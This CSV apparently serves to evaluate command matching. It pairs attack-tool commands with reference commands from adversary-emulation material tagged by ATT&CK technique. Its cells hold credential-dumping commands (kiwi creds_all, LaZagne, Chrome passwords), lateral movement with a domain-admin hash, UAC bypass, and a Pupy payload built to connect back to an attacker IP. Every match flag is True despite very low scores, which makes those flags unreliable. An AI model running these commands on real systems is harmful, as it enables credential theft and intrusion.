file,tool,input_command,matched_command,edit_score,match_found
command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.438,True
command_metasploit_TA0011_T1071.txt,metasploit,use meterpreter/http,`meterpreter> getsystem -t 1`,0.531,True
command_metasploit_TA0011_T1071.txt,metasploit,setg HTTPHost <http_host>,`msf> loot -t screenspy.screenshot`,0.333,True
command_metasploit_TA0011_T1071.txt,metasploit,setg HTTPPort <http_port>,`meterpreter > load powershell`,0.286,True
command_metasploit_TA0011_T1071.txt,metasploit,run,`sudo msfconsole`,0.2,True
command_metasploit_TA0011_T1071.txt,metasploit,use meterpreter/dns,`meterpreter > load powershell`,0.52,True
command_metasploit_TA0011_T1071.txt,metasploit,setg DNSName <dns_name>,"```sh
meterpreter> load kiwi
meterpreter> creds_all
```",0.308,True
command_metasploit_TA0011_T1071.txt,metasploit,setg DNSPort <dns_port>,`msf> loot -t screenspy.screenshot`,0.345,True
command_metasploit_TA0011_T1071.txt,metasploit,run,`sudo msfconsole`,0.2,True
command_paexec_TA0003_T1505.txt,paexec,paexec -i -c <web_server_script_name>.bat," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.207,True
command_plink_TA0001_T1071.txt,plink,plink.exe -no-sanitise-stdout -load <session_name>,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.396,True
command_plink_TA0001_T1071.txt,plink,plink.exe -no-antispoof <fake_website_url>,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.386,True
command_plink_TA0001_T1071.txt,plink,plink.exe -share <session_name>,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.416,True
command_pupy_TA0001_T1078.txt,pupy,creddump,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",0.104,True
command_pupy_TA0003_T1078.txt,pupy,run Lazagne,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",0.135,True
command_pupy_TA0004_T1078.txt,pupy,creddump,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",0.104,True
command_pupy_TA0004_T1078.txt,pupy,bypassuac && getsystem,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",0.16,True
command_pupy_TA0004_T1078.txt,pupy,beroot,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",0.107,True
command_pupy_TA0004_T1078.txt,pupy,lazagne -o db -p <local_db_path>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,0.228,True
command_pupy_TA0004_T1078.txt,pupy,cred -l <local_db_path>,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",0.178,True
command_pupy_TA0005_T1078.txt,pupy,laze -s,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",0.118,True
